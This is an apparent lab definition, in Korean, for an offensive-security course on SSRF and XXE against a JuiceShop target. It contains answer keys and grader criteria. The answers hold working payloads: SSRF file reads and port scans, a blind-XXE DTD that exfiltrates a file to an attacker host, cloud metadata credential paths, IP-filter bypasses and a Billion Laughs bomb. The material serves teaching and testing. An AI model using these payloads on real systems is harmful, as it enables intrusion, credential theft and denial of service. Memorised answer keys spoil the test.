lab_id: attack-adv-nonai-week04
title: 웹 고급 공격 (SSRF/XXE)
version: non-ai
course: attack-adv-nonai
week: 4
description: SSRF(Server-Side Request Forgery)와 XXE(XML External Entity) 등 서버 측 고급 웹 취약점을 실습한다. JuiceShop
  및 실습 환경에서 내부 서비스 접근, 파일 읽기 등 고급 공격 시나리오를 수행한다.
difficulty: hard
duration_minutes: 120
objectives:
- SSRF 취약점을 활용하여 내부 네트워크 서비스에 접근한다
- XXE 인젝션으로 서버 측 파일을 읽고 SSRF로 체이닝한다
- 웹 고급 취약점의 방어 기법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: curl을 사용하여 {{WEB_IP}}:3000에서 SSRF 취약점을 테스트하라. URL 파라미터에 내부 주소(http://localhost:3000)를 입력하여
    서버 측 요청을 유도하라.
  hint: URL 파라미터가 있는 엔드포인트에 내부 주소를 전달한다
  category: exploit
  points: 10
  answer: curl -s 'http://10.20.30.80:3000/profile/image/url?url=http://localhost:3000'
  answer_detail: SSRF는 서버가 사용자 입력의 URL로 요청을 보내는 취약점이다. 공격자는 이를 통해 내부 네트워크의 서비스(Redis, 메타데이터 서버 등)에 접근할
    수 있다. OWASP Top 10 2021에서 A10으로 새로 등재될 만큼 클라우드 환경에서 영향력이 크다.
  verify:
    type: output_contains
    expect: juice
    field: stdout
    semantic:
      intent: SSRF 기본 — curl http://10.20.30.80:3000/profile/image/url?url=http://localhost:3000. OWASP
        A10:2021 SSRF. 서버가 사용자 URL로 요청 → 내부 서비스(Redis/메타데이터) 접근. 클라우드 환경 파급력. CWE-918.
      success_criteria:
      - url=http://localhost 페이로드
      - juice 또는 응답 출력
      - /profile/image/url 엔드포인트
      acceptable_methods:
      - curl URL 파라미터
      - Burp Repeater
      - 포스트맨 SSRF 테스트
      negative_signs:
      - URL 파라미터 없음
      - 내부 주소 미사용
      - OWASP A10 맥락 없음
  target_vm: attacker
- order: 2
  instruction: SSRF를 활용하여 내부 서비스 포트를 스캔하라. curl로 127.0.0.1의 포트 22, 80, 3000, 8080을 순회하며 응답을 확인하라.
  hint: for 루프로 포트를 순회하면서 SSRF 엔드포인트에 각 포트를 전달한다
  category: exploit
  points: 10
  answer: for port in 22 80 3000 8080; do echo "Port $port:"; curl -s -o /dev/null -w '%{http_code}' "http://10.20.30.80:3000/profile/image/url?url=http://127.0.0.1:$port"
    2>/dev/null; echo ''; done
  answer_detail: SSRF를 통한 내부 포트 스캔은 방화벽 뒤의 서비스를 탐색하는 강력한 기법이다. 응답 코드, 응답 시간, 에러 메시지의 차이로 포트 상태를 추정한다.
    Blind SSRF의 경우 외부 서버(Burp Collaborator 등)로 콜백을 유도하여 확인한다.
  verify:
    type: output_contains
    expect: Port
    field: stdout
    semantic:
      intent: SSRF 내부 포트 스캔 — for port in 22 80 3000 8080; do curl url=http://127.0.0.1:$port; done. 응답
        코드/시간/에러 차이로 포트 상태 추론. Blind SSRF는 Burp Collaborator OOB. MITRE T1190 Exploit Public Application.
      success_criteria:
      - for 루프 + 포트 4개 이상
      - Port 키워드 출력
      - 127.0.0.1 + 가변 포트
      acceptable_methods:
      - for 루프 + curl
      - Burp Intruder
      - ssrfmap 자동화
      negative_signs:
      - 루프 없음
      - 단일 포트
      - 응답 분석 없음
  target_vm: attacker
- order: 3
  instruction: SSRF로 file:// 프로토콜을 사용하여 서버의 /etc/passwd 파일 읽기를 시도하라.
  hint: url 파라미터에 file:///etc/passwd를 전달한다
  category: exploit
  points: 10
  answer: curl -s 'http://10.20.30.80:3000/profile/image/url?url=file:///etc/passwd'
  answer_detail: SSRF에서 file:// 프로토콜 핸들러를 허용하면 서버 로컬 파일을 읽을 수 있다. /etc/passwd로 사용자 목록을, /etc/shadow(권한
    필요)로 해시를, /proc/self/environ으로 환경변수(DB 비밀번호 등)를 획득할 수 있다. 방어를 위해 URL 스킴을 http/https로 제한해야 한다.
  verify:
    type: output_contains
    expect: root
    field: stdout
    semantic:
      intent: 'SSRF file:// 파일 읽기 — curl url=file:///etc/passwd. file:// 핸들러 허용 시 로컬 파일. /etc/passwd 사용자
        / /etc/shadow 해시(권한) / /proc/self/environ DB 비번. 방어: URL 스킴 http/https 화이트리스트. CWE-918.'
      success_criteria:
      - file:///etc/passwd
      - root 키워드 출력
      - SSRF + file 스킴
      acceptable_methods:
      - file:// 스킴
      - gopher:// (대안)
      - dict:// 스킴
      negative_signs:
      - file 스킴 없음
      - passwd 미접근
      - SSRF 맥락 없음
  target_vm: attacker
- order: 4
  instruction: XXE(XML External Entity) 공격 페이로드를 작성하라. /etc/hostname 파일을 읽는 XML을 /tmp/xxe_payload.xml에
    저장하라.
  hint: <!DOCTYPE> 선언에 ENTITY를 정의하고, SYSTEM 키워드로 파일을 참조한다
  category: exploit
  points: 10
  answer: "cat > /tmp/xxe_payload.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE\
    \ foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\
    XMLEOF\ncat /tmp/xxe_payload.xml"
  answer_detail: XXE 인젝션은 XML 파서가 외부 엔티티를 처리하도록 악용하는 공격이다. SYSTEM 키워드로 file://, http://, ftp:// 등의 프로토콜을
    통해 파일 읽기, SSRF, DoS(Billion Laughs) 등이 가능하다. 방어를 위해 XML 파서에서 외부 엔티티 처리를 비활성화해야 한다.
  verify:
    type: output_contains
    expect: ENTITY xxe SYSTEM
    field: stdout
    semantic:
      intent: 'XXE 페이로드 — <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]> + <root><data>&xxe;</data></root>.
        OWASP A05:2017 XXE (now A03 Injection). SYSTEM 키워드로 file/http/ftp 프로토콜. 방어: 외부 엔티티 비활성. CWE-611.'
      success_criteria:
      - <!DOCTYPE + ENTITY 선언
      - ENTITY xxe SYSTEM 키워드
      - '&xxe; 참조'
      acceptable_methods:
      - DOCTYPE + ENTITY
      - DOCTYPE 외부 DTD
      - Burp XXE 페이로드
      negative_signs:
      - ENTITY 없음
      - SYSTEM 미사용
      - 엔티티 참조 없음
  target_vm: attacker
- order: 5
  instruction: 작성한 XXE 페이로드를 curl로 XML을 처리하는 엔드포인트에 전송하라. Content-Type을 application/xml로 설정하라.
  hint: 'curl -X POST -H ''Content-Type: application/xml'' -d @파일 형태로 전송한다'
  category: exploit
  points: 10
  answer: "curl -s \\\n     -X POST \\\n     -H 'Content-Type: application/xml' \\\n     -d @/tmp/xxe_payload.xml\
    \ http://10.20.30.80:3000/api/Products"
  answer_detail: XXE 페이로드를 XML을 처리하는 엔드포인트에 전송하면, XML 파서가 엔티티를 확장하면서 파일 내용이 응답에 포함된다. JSON API라도 Content-Type을
    application/xml로 변경하면 XML 파서가 동작하는 경우가 있다. 이를 Content-Type 전환 공격이라 한다.
  verify:
    type: output_contains
    expect: xml
    field: stdout
    semantic:
      intent: 'XXE 전송 — curl -X POST -H ''Content-Type: application/xml'' -d @/tmp/xxe_payload.xml /api/Products.
        JSON API라도 Content-Type 변경하면 XML 파서 동작 → Content-Type 전환 공격. 응답에 엔티티 확장 결과 포함. CWE-611.'
      success_criteria:
      - 'POST + Content-Type: application/xml'
      - -d @파일 페이로드
      - xml 키워드 응답
      acceptable_methods:
      - curl -X POST + xml CT
      - Burp Repeater + Content-Type 변경
      - wfuzz CT injection
      negative_signs:
      - Content-Type 미설정
      - JSON CT
      - 페이로드 미전송
  target_vm: attacker
- order: 6
  instruction: Blind XXE 공격을 위한 외부 DTD 서버를 시뮬레이션하라. 데이터를 외부로 유출하는 DTD 파일을 /tmp/evil.dtd에 작성하라.
  hint: 파라미터 엔티티를 사용하여 파일 내용을 HTTP 요청의 URL에 포함시킨다
  category: exploit
  points: 10
  answer: 'cat > /tmp/evil.dtd << ''DTDEOF''

    <!ENTITY % file SYSTEM "file:///etc/hostname">

    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM ''http://10.20.30.201:4444/?data=%file;''>">

    %eval;

    %exfil;

    DTDEOF

    cat /tmp/evil.dtd'
  answer_detail: Blind XXE는 응답에 데이터가 직접 포함되지 않는 환경에서 사용한다. 외부 DTD를 로딩하도록 유도하고, DTD 내에서 파일 내용을 HTTP 요청의
    파라미터로 전송하여 공격자 서버에서 수신한다. OOB(Out-of-Band) 데이터 유출 기법의 대표적 사례이다.
  verify:
    type: output_contains
    expect: exfil
    field: stdout
    semantic:
      intent: Blind XXE 외부 DTD — <!ENTITY % file SYSTEM 'file:///etc/hostname'> + <!ENTITY % eval ...>
        + %eval; %exfil;. OOB(Out-of-Band) 데이터 유출. 응답에 데이터 미포함 환경에서 공격자 서버로 콜백. 파라미터 엔티티 (%) 활용.
      success_criteria:
      - evil.dtd 작성
      - exfil 키워드
      - 파라미터 엔티티 (%) + SYSTEM
      acceptable_methods:
      - 외부 DTD + 파라미터 엔티티
      - Burp Collaborator OOB
      - interactsh
      negative_signs:
      - 파라미터 엔티티 없음
      - 외부 콜백 없음
      - OOB 맥락 없음
  target_vm: attacker
- order: 7
  instruction: SSRF에서 IP 주소 필터 우회를 시도하라. 127.0.0.1을 다양한 형태(10진수, 16진수, IPv6 매핑)로 변환하여 차단을 우회하라.
  hint: 127.0.0.1 = 0x7f000001 = 2130706433 = 0177.0.0.1 등 다양한 표현이 가능하다
  category: exploit
  points: 10
  answer: 'echo ''=== SSRF IP Bypass Techniques ==='' && echo ''1. Decimal: http://2130706433:3000/''
    && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/'' && echo
    ''4. IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/'' && echo ''6. DNS rebinding:
    attacker.com -> 127.0.0.1'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
  answer_detail: SSRF 방어에서 127.0.0.1이나 내부 IP를 차단하는 블랙리스트 방식은 다양한 IP 표현으로 우회된다. 10진수(2130706433), 16진수(0x7f000001),
    8진수(0177), 축약형(127.1), IPv6 매핑(::ffff:127.0.0.1), DNS 리바인딩 등이 있다. 안전한 방어는 화이트리스트 방식이다.
  verify:
    type: output_contains
    expect: SSRF IP Bypass
    field: stdout
    semantic:
      intent: SSRF IP 우회 — 127.0.0.1 = 10진수(2130706433) + 16진수(0x7f000001) + 8진수(0177.0.0.1) + 축약(127.1)
        + IPv6 매핑([::1]) + DNS 리바인딩. PortSwigger SSRF Cheatsheet. 블랙리스트 우회 → 화이트리스트 방어 필수.
      success_criteria:
      - SSRF IP Bypass 키워드
      - 변환 형태 4개 이상
      - 실 요청 (curl) 검증
      acceptable_methods:
      - 다양한 IP 표현
      - DNS 리바인딩 (rbndr.us)
      - SSRFmap automation
      negative_signs:
      - 변환 형태 2개 이하
      - 단순 127.0.0.1만
      - 방어 화이트리스트 맥락 없음
  target_vm: attacker
- order: 8
  instruction: SSRF를 통한 클라우드 메타데이터 접근을 시뮬레이션하라. AWS EC2 메타데이터 엔드포인트(169.254.169.254)에 접근하는 요청을 구성하라.
  hint: http://169.254.169.254/latest/meta-data/ 경로로 메타데이터에 접근한다
  category: exploit
  points: 10
  answer: 'echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/''
    && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' && echo ''Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01''
    && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
  answer_detail: 클라우드 환경에서 SSRF의 가장 치명적인 활용은 메타데이터 서비스 접근이다. AWS의 169.254.169.254에서 IAM 역할의 임시 자격증명(Access
    Key, Secret Key, Token)을 획득하면 전체 AWS 계정을 장악할 수 있다. Capital One 해킹(2019)이 대표적 사례이다.
  verify:
    type: output_contains
    expect: Cloud Metadata
    field: stdout
    semantic:
      intent: 클라우드 메타데이터 SSRF — AWS 169.254.169.254/latest/meta-data/iam/security-credentials/ + GCP metadata.google.internal
        + Azure /metadata/instance. IAM 임시 자격증명 → 전체 AWS 장악. Capital One 2019 사례. AWS IMDSv2 대응책.
      success_criteria:
      - Cloud Metadata 키워드
      - AWS/GCP/Azure 3종 + 169.254.169.254
      - IAM credentials 경로
      acceptable_methods:
      - 169.254.169.254 메타데이터
      - IMDSv2 token 우회
      - Pacu/CloudGoat 클라우드 익스
      negative_signs:
      - 메타데이터 IP 없음
      - 단일 클라우드만
      - IAM 맥락 없음
  target_vm: attacker
- order: 9
  instruction: XXE를 활용한 서비스 거부(DoS) 공격인 Billion Laughs 페이로드를 작성하라. 지수적으로 확장되는 엔티티를 /tmp/xxe_dos.xml에 작성하라(실행하지
    않음).
  hint: 엔티티가 다른 엔티티를 참조하여 기하급수적으로 확장되도록 구성한다
  category: exploit
  points: 10
  answer: "cat > /tmp/xxe_dos.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol\
    \ \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
    \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"\
    >\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'Billion Laughs payload created (NOT executed for safety)'\
    \ && echo 'Expansion: 10^3 = 1000x amplification at level 4' && cat /tmp/xxe_dos.xml"
  answer_detail: Billion Laughs(XML Bomb)는 재귀적 엔티티 참조로 메모리를 기하급수적으로 소비하는 DoS 공격이다. 10단계 중첩 시 10^9(10억)배로
    확장되어 수 KB의 XML이 수 GB의 메모리를 소비한다. 방어를 위해 엔티티 확장 깊이와 크기를 제한하거나, 외부 엔티티를 비활성화한다.
  verify:
    type: output_contains
    expect: Billion Laughs
    field: stdout
    semantic:
      intent: 'Billion Laughs DoS — <!ENTITY lol ''lol''> + lol2=lol*10 + lol3=lol2*10 + lol4=lol3*10.
        10단계 = 10^9 확장. 수 KB → 수 GB 메모리. 방어: 엔티티 깊이/크기 제한 또는 외부 엔티티 비활성. CWE-776 XML Entity Expansion.'
      success_criteria:
      - Billion Laughs 키워드
      - 재귀 엔티티 (lol/lol2/lol3/lol4)
      - 10^N 확장 설명
      acceptable_methods:
      - Billion Laughs (XML Bomb)
      - Quadratic Blowup
      - External Entity Expansion
      negative_signs:
      - 재귀 엔티티 없음
      - 확장 비율 없음
      - DoS 맥락 없음
  target_vm: attacker
- order: 10
  instruction: SSTI(Server-Side Template Injection) 취약점을 테스트하라. curl로 {{WEB_IP}}:3000에 템플릿 표현식({{7*7}})을
    다양한 파라미터에 삽입하라.
  hint: '{{7*7}}이 49로 평가되면 SSTI 취약점이 존재한다'
  category: exploit
  points: 10
  answer: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D'' && echo '''' &&
    curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}'' && echo '''' && echo ''SSTI test:
    if 49 appears in response, template injection exists'''
